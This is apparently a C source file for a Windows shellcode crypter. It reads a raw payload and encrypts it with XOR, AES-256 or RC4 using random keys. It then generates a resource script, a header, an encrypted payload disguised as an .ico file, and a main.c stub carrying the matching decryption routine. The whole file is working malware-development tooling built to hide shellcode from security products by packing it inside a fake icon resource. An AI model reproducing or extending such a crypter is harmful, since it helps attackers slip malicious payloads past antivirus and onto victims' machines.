#include <Windows.h>
#include <stdio.h>
#include "AesPadding.h"
#include "DecryptingFunctions.h"
#include "XOR.h"
#include "AES.h"
#include "RC4.h"

#define INCLUDE_WINDOWS	        "#include <Windows.h>"
#define INCLUDE_AES_H			"#include \"AES.h\""
#define INCLUDE_RESOURCE	    "#include \"resource.h\""


#define RESOURCE_FILE_NAME		"resource.rc"
#define HEADER_FILE_NAME		"resource.h"
#define MAIN_FILE_NAME			"main.c"
#define PAYLOAD_FILE_NAME		"PAYLOAD.ico"

#define RESOURCES_BUFFER		"#include \"resource.h\"\nMY_PAYLOAD RCDATA PAYLOAD.ico\n\n"
#define HEADER_BUFFER			"#define MY_PAYLOAD 0x314\n\n\n"



typedef struct MyStruct {
	SIZE_T BytesNumber; // number of bytes read from the file 
	PVOID pShell;       // pointer to the shellcode read (here it is not appended) 
	PVOID pNewShell;    // pointer to the shellcode (appended)
	SIZE_T FinalSize;   // the size of the new appended shellcode
	HANDLE hFile;		// handle to the file created  
};

struct MyStruct PayloadData = { 0 };

BOOL ReadBinFile(char* FileInput) {
	HANDLE hFile;
	DWORD FileSize, lpNumberOfBytesRead;
	BOOL Succ;
	PVOID FileBytes;
	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: [%d]\n", GetLastError());
		return FALSE;
	}
	FileSize = GetFileSize(hFile, NULL);
	FileBytes = malloc((SIZE_T)FileSize);
	Succ = ReadFile(hFile, FileBytes, FileSize, &lpNumberOfBytesRead, NULL);
	if (!Succ) {
		printf("[!] ReadFile Failed With Error:\n", GetLastError());
		return FALSE;
	}
	PayloadData.BytesNumber = (SIZE_T)lpNumberOfBytesRead;
	PayloadData.pShell = FileBytes;
	CloseHandle(hFile);
	return TRUE;
}

BOOL GeneralWriteFile(char* FileName, char* Buffer, DWORD ToWrite) {

	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD lpNumberOfBytesWritten = NULL;


	hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!WriteFile(hFile, Buffer, ToWrite, &lpNumberOfBytesWritten, NULL)) {
		return FALSE;
	}

	if (lpNumberOfBytesWritten != ToWrite) {
		return FALSE;
	}


	CloseHandle(hFile);

	return TRUE;
}

VOID PrintKey(const char* keyname, unsigned char* key, size_t size) {

	printf("unsigned char %s[%d] = { ", keyname, size);
	for (int i = 0; i < size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i == size - 1) {
			printf("0x%02x", key[i]);
		}
		else {
			printf("0x%02x, ", key[i]);
		}
	}
	printf(" };\n");
}


int printUsage(char* MeLocation) {
	printf("[!] Usage: %s <payload file path> [Option*]\n", MeLocation);
	printf("[i] Option Can Be : \n");
	printf("\t[1] \"XOR\" ::: Encrypt The Input Payload Using Custom XOR Algorithm\n");
	printf("\t[2] \"AES\" ::: Encrypt The Input Payload Using AES 256\n");
	printf("\t[3] \"RC4\" ::: Encrypt The Input Payload Using RC4 With Random Generated 16 Byte Key\n");
	printf("[i] ");
	system("PAUSE");
	return -1;
}


int main(int argc, char* argv[]) {
	int Type = 0;
	BOOL Success = FALSE;
	char OutputShellFileName[32];
	char MainBuffer[2048];

	// args check:
	if (argc != 3) {
		return printUsage(argv[0]);
	}

	// checking if we can read the payload
	if ((!ReadBinFile(argv[1])) || PayloadData.pShell == NULL || PayloadData.BytesNumber == NULL) {
		system("PAUSE");
		return -1;
	}
	printf("[i] Size Of Shellcode: %ld \n", (unsigned int)PayloadData.BytesNumber);

	// checking the format of the shellcode to output 



	// copying the data to the new final pointer ( FinalSize && pNewShell )
	PayloadData.pNewShell = malloc(PayloadData.BytesNumber);
	memcpy(PayloadData.pNewShell, PayloadData.pShell, PayloadData.BytesNumber);
	PayloadData.FinalSize = PayloadData.BytesNumber;
	
	// seed for the random keys generated
	srand(time(NULL) + 25);


	// if xor:
	if (strcmp(argv[2], "XOR") == 0 || strcmp(argv[2], "xor") == 0 || strcmp(argv[2], "Xor") == 0) {

		XOR_EASY(PayloadData.pNewShell, PayloadData.FinalSize);
		sprintf(MainBuffer, "%s\n%s\n#define KEY 0x%0.2X\n\n%s\n", INCLUDE_WINDOWS, INCLUDE_RESOURCE, KEY, XorDecryptionFunction);

	}
	// if aes:
	else if (strcmp(argv[2], "AES") == 0 || strcmp(argv[2], "Aes") == 0 || strcmp(argv[2], "aes") == 0) {
		//VOID AesPad(PVOID pOldPayload, SIZE_T sOldSize, PVOID pNewPayload, SIZE_T* psNewSize)
		PVOID pPaddedShellcode = NULL;
		SIZE_T sSizeShellcode = NULL;
		AesPad(PayloadData.pShell, PayloadData.BytesNumber, &pPaddedShellcode, &sSizeShellcode);
		ZeroMemory(PayloadData.pNewShell, PayloadData.FinalSize);
		free(PayloadData.pNewShell);

		//printf("[i] pPaddedShellcode : 0x%p || sSizeShellcode : %d \n", pPaddedShellcode, sSizeShellcode);
		//system("PAUSE");

		PayloadData.pNewShell = malloc(sSizeShellcode);
		memcpy(PayloadData.pNewShell, pPaddedShellcode, sSizeShellcode);
		PayloadData.FinalSize = sSizeShellcode;

		//printf("[i] PayloadData.pNewShell : 0x%p || PayloadData.FinalSize : %d \n", PayloadData.pNewShell, PayloadData.FinalSize);
		//system("PAUSE");

		unsigned char AesKey[AESKEYSIZE];
		unsigned char AesIv[IVKEYSIZE];

		GenRandomisedBytes(AesKey, AESKEYSIZE);
		GenRandomisedBytes(AesIv, IVKEYSIZE);

		PrintKey("iv", AesIv, IVKEYSIZE);
		PrintKey("key", AesKey, AESKEYSIZE);
		

		struct AES_ctx ctx;
		AES_init_ctx_iv(&ctx, AesKey, AesIv);
		AES_CBC_encrypt_buffer(&ctx, PayloadData.pNewShell, PayloadData.FinalSize);

		sprintf(MainBuffer, "%s\n%s\n%s\n\n\n\n%s\n", INCLUDE_WINDOWS, INCLUDE_RESOURCE, INCLUDE_AES_H, AesDecryptionFunction);
	}

	// if rc4:
	else if (strcmp(argv[2], "RC4") == 0 || strcmp(argv[2], "Rc4") == 0 || strcmp(argv[2], "rc4") == 0) {
		unsigned char Rc4Key[RC4KEYSIZE];
		GenRandomisedBytes(Rc4Key, RC4KEYSIZE);
		Rc4EncDecPayload(Rc4Key, PayloadData.pNewShell, PayloadData.FinalSize);
		
		PrintKey("Rc4Key", Rc4Key, RC4KEYSIZE);

		sprintf(MainBuffer, "%s\n%s\n\n\n%s\n", INCLUDE_WINDOWS, INCLUDE_RESOURCE, Rc4DecryptionFunction);

	}




	else {
		printf("[!] Unkown Input : %s \n", argv[2]);
		return printUsage(argv[0]);
	}




	//generate resources.rc
	GeneralWriteFile(
		RESOURCE_FILE_NAME,
		RESOURCES_BUFFER,
		strlen(RESOURCES_BUFFER)
	);


	// generate resources.h
	GeneralWriteFile(
		HEADER_FILE_NAME,
		HEADER_BUFFER,
		strlen(HEADER_BUFFER)
	);


	// generate the encrypted shellcode file
	GeneralWriteFile(
		PAYLOAD_FILE_NAME,
		PayloadData.pNewShell,
		PayloadData.FinalSize
	);

	GeneralWriteFile(
		MAIN_FILE_NAME,
		MainBuffer,
		strlen(MainBuffer)
	);


	return 0;
}